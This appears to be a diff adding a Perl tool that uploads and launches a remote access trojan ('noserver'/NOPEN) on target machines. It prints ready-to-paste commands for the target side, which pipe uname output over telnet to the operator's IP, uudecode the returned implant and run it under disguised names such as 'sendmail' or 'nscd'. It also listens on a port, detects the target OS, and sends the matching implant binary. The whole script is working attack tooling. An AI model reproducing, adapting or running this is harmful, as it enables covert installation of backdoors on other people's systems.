@@ -1,0 +1,570 @@
+#!/usr/bin/env perl
+use IO::Socket ;
+use File::Basename;
+#use Time::HiRes qw( time );
+require "getopts.pl";
+#version:
+$VER="2.7";
+# ===============
+# 03 JAN 2003: now not counting noserver*Z in up. now writing ratremotename.Z locally
+#              and chmod 755 it.
+# ===============
+# 19 JUL 2002: Added -z option to old way
+# ===============
+# 26 JUN 2002: Added automated option
+# ===============
+# 18 MAR 2002
+#
+
+
+$SIG{INT} = \&catch_zap; 
+
+$| = 1 ;
+$prog = basename ${0};
+$portmin = 1 ;
+$portmax = 65535 ;
+$maxlen = 1024 ;
+setusagetext() ;
+usage("Bad options") if (! &Getopts( "ha:E:A:Cxi:d:T:veqLzp" ));
+usage() if ($opt_h);
+$automatedmode = $opt_a ;
+$ratpreargs = $opt_E ;
+$ratpostargs = $opt_A ;
+$nocompress = $opt_C || $opt_z;
+$donotexecute = $opt_x ;
+$callip = $opt_i ;
+$remotedir = $opt_d ;
+$noescape = $opt_e ;
+$quiet = $opt_q ;
+$nopastables = $opt_p ;
+$listen = ! $opt_L ;
+$TOP = $opt_T ;
+$TOP = "/current" unless ($TOP);
+$ratdir = "${TOP}/up/morerats" ;
+#$trmunge = $opt_t ; # deleted for now
+if ($opt_v) {
+  print "$prog version $VER\n";
+  exit;
+}
+# this messing up scripme?
+$colornorm = "";
+$colorfail = "";
+$colorwarn = "";
+$colornote = "";
+$colorgren = "";
+
+$colornorm = "\033[0;39m";
+$colorfail = "\033[1;31m";
+$colorwarn = "\033[1;33m";
+$colornote = "\033[0;34m";
+$colorgren = "\033[1;32m";
+
+
+if ($ARGV[$#ARGV] >= $portmin and $ARGV[$#ARGV] <= $portmax) {
+  $port = pop (@ARGV) ;
+}
+$ratremotename = $ARGV[0] ;
+$ratremotename = "sendmail" unless ($ratremotename);
+$ratlocalname =  $ARGV[1] ;
+$ratlocalname =  "noserver" unless ($ratlocalname) ;
+
+if ( -d "${TOP}/up/morerats" ) {
+  docmd("sum ${TOP}/up/${ratlocalname}* 2>/dev/null > ${TOP}/up/morerats/.sums") ;
+  if (! -e "${TOP}/up/morerats/sums") {
+    progprint("Patience, please...summing rats into $ratdir/sums...",$colorwarn);
+    docmd("sum $ratdir/* 2>/dev/null >> $ratdir/.sums") ;
+    rename("$ratdir/.sums","$ratdir/sums") ;
+  } else {
+    progprint("Rats already summed in $ratdir/sums",$colornote) unless ($automatedmode == "h");
+    docmd("cd $ratdir ; cat .sums sums > .sumstmp ; mv .sumstmp sums ; rm .sums*") ;
+  }
+}
+
+if ($automatedmode) {
+  $ratlocalname =  $ARGV[1] ;
+  usage() if ($automatedmode eq "h") ;
+  automatedupload() ;
+  exit;
+}
+# Proceed with old manual style
+print "\n${colorgren} local: $ratlocalname\nremote: $ratremotename\n$colornorm\n";
+$ratlocalname = "${TOP}/up/noserver" if (! -e $ratlocalname) ;
+usage ("noserver does not exist in ./ or ${TOP}/up") if (! -e $ratlocalname) ;
+
+print "$colorwarn\nExecuting: \n$colornorm\n" ;
+docmd("chmod 755 $ratlocalname") ;
+if ($nocompress) {
+  docmd ("uuencode $ratlocalname $ratremotename > ${ratremotename}.uu",1) &&
+    usage ("$! returned running:
+uuencode ${ratlocalname} ${ratremotename} > ${ratremotename}.uu") ;
+} else {
+  docmd ("compress -c ${ratlocalname} > ${ratremotename}.Z",1) ;
+  docmd ("chmod 755 ${ratremotename}.Z",1) ;
+  docmd ("uuencode ${ratremotename}.Z ${ratremotename}.Z > ${ratremotename}.uu",1) &&
+    usage ("$! returned running:
+compress -c ${ratlocalname} | uuencode ${ratremotename}.Z > ${ratremotename}.uu\n") ;
+}
+
+docmd ("ls -alL *.uu",1) ;
+docmd ("head -2 *.uu",1) ;
+$size = (-s "$ratlocalname") ;
+chomp($sum =  `sum $ratlocalname` ) ;
+docmd ("(ls -alL ${ratremotename}.uu ${ratlocalname}* ; ls -alL $ratdir/* 2>/dev/null) | egrep \"$size|Z\$\" | sort -u",1) if ($size) ;
+docmd ("grep \"$sum\" $ratdir/sums | sort -u",1) if ($sum) ;
+docmd ("file -L ${ratlocalname}*",1) ;
+
+if ( $port && $listen ) {
+  print "\n${colornote}\nNow sending ${ratremotename}.uu via $port/tcp with:
+" ;
+  docmd ("nc -l -p $port < ${ratremotename}.uu",1) ;
+}
+print "$colornorm\n";
+
+# end main logic
+
+
+sub automatedupload {
+  $port = $automatedmode ;
+  usage("Too many arguments with -a option (\$ratlocalname=$ratlocalname).") if ($ratlocalname) ;
+  if ($port and ! ($port >= $portmin and $port <= $portmax) ) {
+    usage("Port $port is out of range ($portmin-$portmax)");
+  }
+  if ($remotedir) {
+    usage("workdir ($remotedir) must be full pathname starting with /.")
+      unless ($remotedir =~ /^\// ) ;
+    $workdir = "mkdir -p $remotedir ; cd $remotedir || " ;
+  } else {
+    $workdir = "" ;
+  }
+  if ($callip) {
+    usage("Bad IP $callip") if (! ipcheck($callip)) ;
+  } else {
+    my @interface = (ppp0,eth0,eth1) ;
+    foreach (@interface) {
+      last if ($callip) = 
+	(`ifconfig $_ 2>/dev/null | grep inet` =~ /inet addr:([0-9.]+) /) ;
+    }
+  }
+  if ($donotexecute and ($ratpostargs or $ratpreargs)) {
+    usage("cannot use -x with either -A or -E") ;
+  } else {
+    if ($ratpostargs) {
+      progprint("Pastable will set rat's (fake) arguments to: $ratpostargs");
+    }
+    if ($ratpreargs) {
+      my $ratport ;
+      ($ratport) = ($ratpreargs =~ /(\d*)$/ );
+      usage(" rat environment variable(s) appear to have a bad port.
+port must be 1 <= port <= 65534.") if
+  ($ratport and $ratport < 1 or $ratport > 65534) ;
+      progprint("Pastable will set this environment for rat: $ratpreargs") unless $nopastables ;
+    }
+  }
+  die "Must have $ratdir to use automated mode (choose miscrats next time)!" if (! -d "$ratdir");
+  @noserversinup = split (/\n/,`find ${TOP}/up/noserver* | grep -v Z\$`) ;
+  if ($#noserversinup > 0) {
+    progprint("WARNING: More than one noserver* in ${TOP}/up.",$colorwarn,1) ;
+  }
+  if ($#noserversinup < 0) {
+    progprint("WARNING: You have no noserver* in ${TOP}/up.",$colorwarn,1);
+  } else {
+    $noserverinup = pop (@noserversinup) ;
+    die "Do not have read permission for $noserverinup\n" if 
+      (! -r "$noserverinup");
+    chomp($suminup = `sum $noserverinup | awk '{print $1}'`) ;
+    progprint("Using $noserverinup to determine nopen version to send.") ;
+  }
+  # The "tail -1" in the following will get the bottom of the list of noservers
+  # alphabetically if $suminup was "" due to there being no noservers in up.
+  chomp($tmp = `grep "$suminup" $ratdir/sums | tail -1 | awk '{print $3}'`);
+  ($junk,$nopenvertouse) = split (/-/,$tmp) ;
+  die "Cannot determine nopen version to use" unless $nopenvertouse ;
+  progprint("Will upload NOPEN version $nopenvertouse.") ;
+  progprint("Platform will be determined by target's uname -a.");
+#  # First see that we have $ratdir nicely populated
+#  if (! opendir (DIR,"$ratdir") ){
+#    die "Cannot open $raddir: $!";
+#  }
+#  foreach (sort readdir(DIR) ) {
+#    next if (/^\./) ; # skip . and .. and .dotfiles
+#    next unless (/^noserver/) ;
+#    ($nover,$platform,$platformver) = /noserver-([0-9.]+)\.(.*)-([0-9.]+)$/ ;
+#  }
+#  # Got all our rats in a line, now listen up
+#exit;
+
+  # what do we call it over there?
+  unless ($nocompress) {
+    $othermv = " mv -f $ratremotename $ratremotename.uhoh$$ ; " ;
+    $ratremotename .= ".Z" ;
+  }
+  if ($ratremotename) {
+    progprint("Will uuencode as \"$ratremotename\".");
+  }
+  $runtoo = "";
+  if ($donotexecute) {
+    progprint("NOT RUNNING RAT. That's up to you.",$colorfail);
+    sleep 1.2 ;
+  } else {
+    if ($nocompress) { #no compression
+      $runtoo = "&& PATH=${remotedir}:. $ratpreargs $ratremotename $ratpostargs" ;
+    } else {
+      my $ratremotename_noz = $ratremotename ;
+      $ratremotename_noz =~ s/\.Z// ;
+      $runtoo = "&& uncompress $ratremotename && PATH=${remotedir}:. $ratpreargs $ratremotename_noz $ratpostargs" ;
+    }
+  }
+
+  unless ($nopastables) {
+    $pastables[0] = "
+\t$workdir cd /tmp ; (w ; ls -alrt /tmp ; uname -a ;$othermv mv -f $ratremotename $ratremotename.uhoh$$ 2>/dev/null; sleep 180) | telnet $callip $port | uudecode $runtoo
+" ;
+    $pastables[1] = "
+\t$workdir cd /tmp ; (w ; ls -alrt /tmp ; uname -a ;$othermv mv -f $ratremotename $ratremotename.uhoh$$ 2>/dev/null; sleep 360) | telnet $callip $port | uudecode $runtoo
+" ;
+    # disable this one for now
+    # $pastables[2] = "
+    #\t$workdir cd /tmp ; (uname -a ;$othermv mv -f $ratremotename $ratremotename.uhoh$$ 2>/dev/null; C=0;while [ \"\$C\" -lt 8 ] || [ ! \"\`ls -al $ratremotename 2>/dev/null | awk '{print \$5}'\`\"  = \"\$L\" ];do sleep 1;C=\`expr \$C + 1\`;echo \"DBG L=\$L N=\$N C=\$C\" >&2 ;N=\"\`ls -al $ratremotename 2>/dev/null | awk '{print \$5}'\`\";[ \"\$N\" = \"\$L\" ] || C=0 && L=\"\$N\";done ) | telnet $callip $port | uudecode $runtoo
+    #" ;
+    $pastables = "
+
+For the far side, choose one of these, or build your own. You
+can triple-click to get the entire line. These have time delays
+of 3 minutes and 6 minutes, respectively.
+
+But NOTE: without a tty (with BS, for example), the sleep will
+not need to finish for the rat to run.
+";
+    #if put [2] back in: or until the result stops growing for 7 seconds (this
+    #one is a long string, obviously. It is only recommended if you
+    #already have shell access).
+    #
+
+    if ($trmunge) {
+      #TODO: Maybe later do this without "echo" and such on this end
+      $alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZ./abcdefghijklmnopqrstuvwxyz0123456789 <>&" ;
+      chomp($set1 = `permute "$alpha"`) ;
+      chomp($set2 = `permute "$set1"`) ;
+      for ($i = 0 ; $i <= $#pastables ; $i++ ) {
+	$munged = `echo "$pastable[$i]" | tr "$set1" "set2"` ;
+	$pastables[$i] =" ";
+      }
+    }
+    foreach (@pastables) {
+      $pastables .= $_ ;
+    }
+    $pastables =~ s/  / /g ;	# single spaces only
+    if ($noescape) {
+      progprint("NOT escaping \" or \` in the following pastables.",
+		 $colorwarn);
+    } else {
+      progprint("Pastables below have \" and \` (backtick) characters escaped.",
+		 $colorwarn);
+      progprint("Use -e option to avoid escaping \" and \` (backtick).",
+		 $colorwarn);
+      # escape any doublequotes or backticks in $pastables
+      $pastables =~ s/\"/\\\"/g ;
+      $pastables =~ s/\`/\\\`/g ;
+    }
+    if (! $quiet) {
+      progprint($pastables,
+		 $colorgren);
+    } else {
+      my $tmp = $pastables[0];
+      $tmp =~ s/  / /g ; # single spaces only
+      if (! $noescape) {
+	$tmp =~ s/\"/\\\"/g ;
+	$tmp =~ s/\`/\\\`/g ;
+      }
+      print STDOUT "$tmp" ;
+    }
+  } # end unless $nopastables
+
+  return unless $listen ;
+
+  $server  = IO::Socket::INET->new(LocalPort  => $port,
+				   Type       => SOCK_STREAM,
+				   Reuse      => 1,
+				   Listen     => 1 )
+    or die "Cannot be a tcp server on port $port : $@\n";
+  progprint("Starting listen for it on $port",$colorwarn) ;
+  docmd("touch /current/.packrat$port") ;
+  $client = $server->accept() ;
+  $other_end = getpeername($client)
+    or die "Could not identify other end: $!\n";
+  ($other_port, $other_iaddr) = unpack_sockaddr_in($other_end);
+  $other_ip = inet_ntoa($other_iaddr) ;
+  progprint("connect on $port for output from $other_ip:$other_port") ;
+  # parent accepts output from other end
+#  while (defined ($line = <$client>) ) {
+  my $recvbytes = 0 ;
+  my $sentbytes = 0 ;
+  while (1) {
+    recv ($client, $line, $maxlen, $flags)
+      or die ("Cannot receive (after $recvbytes bytes): $!\n") ;
+    next unless ($line) ;
+    $recvbytes += length($line);
+    print STDOUT "$colornorm>>remote: $line";
+    ($os, $name, $osver,@restofuname) = split(/\s/,$line);
+    $restofuname = "" ;
+    $restofuname .= "$_ " foreach (@restofuname) ;
+    chop ($restofuname) ; # get rid of extra space
+    $os = uc $os ;
+    next unless ($os and $name and $osver and $restofuname) ;
+    if ($os eq "LINUX") {
+      progprint("remote system is Linux: $os $name  $osver @restofuname") ;
+      progprint("Just guessing--will use noserver-2.4.1-i686.pc.linux.gnu.mandrake-8.1") ;
+      $ratlocalname = "$ratdir/noserver-2.4.1-i686.pc.linux.gnu.mandrake-8.1" ;
+    } elsif ($os eq "SUNOS") {
+      if ($restofuname =~ /i386/) { # got an intel
+	$ratlocalname = "$ratdir/noserver-${nopenvertouse}-i386.pc.solaris-2.6" ;
+      } elsif ( $restofuname =~ /sparc/ ) {
+	$osver =~ s/^5\./2./ ; # use 2.* naming convention
+	if ($osver eq "2.5" or $osver eq "2.5.1" or $osver eq "2.4" or $osver eq "2.3") {
+	  $ratlocalname = "$ratdir/noserver-${nopenvertouse}-sparc.sun.solaris-$osver" ;
+	} elsif ($$osver eq "2.6" or $osver eq "2.7" or
+		 $osver eq "2.8" or $osver eq "2.9") {
+	  $ratlocalname = "$ratdir/noserver-${nopenvertouse}-sparc.sun.solaris-2.5.1" ;
+	} else {
+	  $bailnow = "Damn. Got SUNOS but don't know what the release is.";
+	  $colorbail = $colorfail ;
+	  last;
+	}
+      } elsif (1) {
+	$bailnow = "Not supported yet: $os $name $osver @restofuname" ;
+	$colorbail = $colorfail ;
+      }
+    } elsif ($os eq "IRIX") {
+      if ($osver eq "6.5" or $osver eq "6.4" or $osver eq "6.3" or 
+	  $osver eq "5.3") {
+	$ratlocalname = "$ratdir/noserver-${nopenvertouse}-mips.sgi.irix-$osver" ;
+      }
+    } elsif ($os eq "OSF1") {
+      if ($osver eq "V4.0" or ( $restofuname =~ /alpha/i )) {
+	$ratlocalname = "$ratdir/noserver-${nopenvertouse}-alphaev6.dec.osf4.0f" ;
+      }
+    } else {
+      progprint( "Don't see uname output there--keep looking.",$colorfail) ;
+      next;
+    }
+    progprint("We have uname output we can handle.",$colorgren);
+    progprint("sending $ratlocalname") ;
+    chomp( my $tmp = `ls -aLl $ratlocalname | cut -c 32-999`);
+    progprint($tmp) ;
+    last;
+  }
+  unless ($nocompress) {
+    progprint("compressing $ratlocalname");
+    docmd("rm -rf  /tmp/rat /tmp/rat.Z") ;
+    docmd("cp -f $ratlocalname /tmp/rat && compress /tmp/rat",1) ;
+    $ratlocalname = "/tmp/rat.Z" ;
+  }
+  progprint("uuencoding $ratlocalname") ;
+  print `uuencode $ratlocalname ./$ratremotename > $ratremotename.uu 2>&1` ;
+  if (! -e "$ratremotename.uu") {
+    $bailnow = "uuencode failed to create $ratremotename.uu" ;
+  }
+  while (! $bailnow) {
+
+    if (! open (IN, "< $ratremotename.uu") ) {
+      $bailnow = "cannot open $ratremotename.uu for read" ;
+      $colorbail = $colorfail ;
+      last;
+    }
+    my $size = (-s "$ratremotename.uu") ;
+    $sentbytes = 0 ;
+    $timestart = time ;
+    while ($count = read(IN,$buf,2048) ) {
+      # force far end to chmod 700
+      $buf =~ s/^begin \d\d\d /begin 700 / ;
+      $sentbytes += send ($client, $buf, $maxlen, $flags) ;
+      $microseconds = time - $timestart ;
+      $speed = int  8 / 1024 * $sentbytes/$microseconds ;
+      $eta = int (100 * (($size - $sentbytes) * (8/1024) / $speed)) / 100 ;
+      progprint("Sent $sentbytes/$size at $speed kbps. ETA: $eta seconds",1);
+    }
+    close (IN);
+    $microseconds *= 1000 ;
+    $microseconds = int $microseconds ;
+    $microseconds /= 1000 ;
+    $bailnow = "Done. Sent $sentbytes in $microseconds seconds at $speed kbps";
+    $colorbail = $colorgren;
+  }
+  progprint("");
+  progprint("Bailing: $bailnow",$colorbail);
+  dienice() ;
+} # end sub automatedupload
+
+sub dienice {
+  # die gracefully
+  sleep 1;
+  $server->shutdown(2);
+  progprint(" Bailed: Sent $sentbytes, received $recvbytes.",$colorbail);
+  
+  progprint("DON'T FORGET: You might have sleeps running if remote end connected.",$colorwarn);
+
+  unlink("/current/.packrat$port") ;
+
+} # end sub dienice
+
+sub catch_zap {
+  warn("\a${colorfail}Repeat ^C three times to kill.\n$colornorm\n");
+  dienice() if $zaptimes++ >= 2 ;
+} # end sub catch_zap
+
+sub docmd () {
+  # if second argument given, echo command executed with print statement
+  local($command,@junk) = @_;
+  print "\n[$prog]# " if ($verbose || $debug || @junk);
+  print "$command\n" if ($verbose || $debug || @junk);
+  system($command);
+} # end sub docmd
+
+sub usage() {
+  print "$colorfail\nFATAL ERROR: @_\n$colornorm\n" if (@_) ;
+  print $usagetext unless $automatedmode;
+  print $usagetextauto if $automatedmode;
+  print "$colorfail\nFATAL ERROR: @_\n$colornorm\n" if (@_) ;
+  exit;
+} # end sub usage
+
+sub progprint() {
+  local ($str,$color,@stuff) = @_ ;
+  return if $quiet ;
+  $STD="STDERR" ; # took this out
+  my $oldfh = select ($STD) ;
+  my $scripme = $ENV{EXPLOIT_SCRIPME} ;
+  $| = 1 ;
+  print "$colornote";
+  print STDOUT "$colornote" if $scripme ;
+  if ($color == (1)) {
+    print "\r[$prog: $str]        ";
+    print STDOUT "\r[$prog: $str]        " if $scripme ;
+  } elsif (! $str) {
+    print "$colornorm\n";
+    print STDOUT "$colornorm\n" if $scripme ;
+  } else {
+    $color = $colornote unless ($color);
+    print "${color}[$prog: $str]\n$colornorm";
+    print STDOUT "${color}[$prog: $str]\n$colornorm" if $scripme ;
+  }
+  select $oldfh ;
+} # end sub progprint
+
+sub ipcheck() {
+  # returns 1 iff $ipstr is in dotted decimal notation with each 
+  # octet between 0 and 255 inclusive (i.e. 0.0.0.0 and 255.255.255.255 are valid)
+  local($ipstr,@junk) = @_;
+  # need -1 in following split to keep null trailing fields (to reject "1.2.3.4.")
+  @octets=split(/\./,$ipstr,-1);
+  return 0 if ($#octets != 3);
+  foreach (@octets) {
+    # return 0 if (empty or nondigits or <0 or >255)
+    return 0 if ($_ eq "" || ( /\D/ ) || $_ < 0 || $_ > 255);
+  }
+  return 1;
+} # end sub ipcheck
+
+
+sub setusagetext {
+$usagetext = "
+Usage: $prog -a  (automated mode--use \"$prog -ah\" for help on that)
+       $prog [-z] [ratremotename [ratlocalname] ] [port]
+
+MANUAL MODE
+
+$prog packages up a RAT binary in the usual format with:
+
+   cp ratlocalname ratremotename
+   compress -c ratremotename |  uuencode ratremotename.Z > ratremotename.uu
+
+OR if the -z option is given, the compress part is omitted:
+
+   uuencode ratremotename ratremotename > ratremotename.uu
+
+If only a ratremotename is provided, 'noserver' is assumed for the
+ratlocalname, if it exists. If neither ratremotename nor ratlocalname are
+provided, 'sendmail' and 'noserver' are the defaults, respectively.
+
+If the port is provided and is between $portmin and $portmax, then the newly
+created .uu file is prepared for sending via TCP with:
+
+    nc -l -p port < ratremotename.uu
+
+$prog provides output containing the upload file's size and results of
+'file ratlocalname' as an added check of the program's platform.
+
+$prog version $VER
+" ;
+$usagetextauto = "
+Usage: $prog -a sendport [options] [ratremotename]
+       $prog -ah                  show this usage statement and exit
+
+AUTOMATED MODE (-a) options:
+
+These options are used to build a command for your target to run:
+
+ [-CxeqL] [-E \"rat-env-vars\"] [-A \"fake-rat-args\"] [-i callip] [-d workdir] [-T local-topdir]
+
+  -a  listen on sendport for connection from remote host
+
+  -C  do NOT compress uploaded file (default is to compress)
+
+  -x  do NOT have the pastable execute the rat once uploaded
+      (default is to run it)
+
+  -e  do NOT escape double quotes and backticks in pastables (default does)
+      You want the default if you're pasting the pastable into something like
+      ./bs -c \"pastable-goes-here\".
+
+  -q  only output will be the command needed on remote end.
+
+  -L  print all output but then DO NOT LISTEN -- merely exit. Useful with -q
+      to get syntax for remote end without doing any listen yet.
+
+  -E  set environment variable used remotely by rat for its arguments.
+      E.g., use -E 'D=\"-l 112233\"' to have nopen (ver. > 2.5) listen
+      on port 112233, or 'D=\"-c IPADDRESS 112233\"' to have nopen
+      server call a waiting client listening on its port 112233.
+
+  -A  set this to whatever the rat's \"fake\" arguments should be.
+      E.g., -A '-bd -q15m'
+
+  -i  use callip for connections back to sendport. This defaults to the IP
+      of ppp0 or, if ppp0 is not there, eth0.
+
+  -d  put the rat in workdir (defaults to /tmp). If unable to make or cd to
+      workdir, put it in /tmp anyway.
+
+  -T  use \"local-topdir\" instead of /current
+
+$prog opens the port given, expecting to see the output of 'uname -a'
+from the remote host. You are then provided with a pastable (long) line for
+the remote host, using the options you chose. It might look something like
+this (if you ran '$prog -a 32121 -d /tmp/workdir -x'):
+
+  mkdir -p /tmp/workdir && cd /tmp/workdir || cd /tmp ; \\
+  ( uname -a ; mv -f sendmail sendmail.uhoh\$\$ ; \\
+    mv -f sendmail.Z sendmail.Z.uhoh\$\$; sleep 360 ) | \\
+  telnet YOURIP 32121 | uudecode
+
+Or, if you ran
+'$prog -a 32121 -C -E 'D=\"-c 100.200.100.200 12121\"' -i100.200.100.200\ nscd':
+
+  cd /tmp ; \\
+  ( uname -a ; mv -f nscd nscd.uhoh\$\$ ; sleep 360 ) | \\
+  telnet 100.200.100.200 32121 | uudecode && \\
+  PATH=. D=\\\"-c 100.200.100.200 12121\\\" nscd
+
+Once the uname output is received and the correct server is found in
+$ratdir/, it is uuencoded and sent up to the far end via the
+same already established TCP session. The file is called 'sendmail'
+unless some other ratremotename was provided as $prog's final argument.
+
+$prog version $VER
+";
+
+#  removed this one for now
+#  -t  turn ON tr munging (default is OFF)
+
+}
